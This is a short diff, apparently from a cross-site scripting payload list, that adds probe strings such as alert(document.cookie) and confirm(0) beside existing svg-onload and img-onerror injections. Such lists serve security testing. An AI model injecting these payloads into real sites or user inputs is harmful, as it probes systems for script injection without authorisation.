@@ -9,3 +9,8 @@ javascript:alert(1)
 </script><svg onload=alert(1)> 
 ‘-confirm(1)-‘
 <img src=x onerror=alert(1)>
+prompt(5000/200)
+alert(6000/3000)
+alert(/XSS/)
+alert(document.cookie)
+confirm(0)
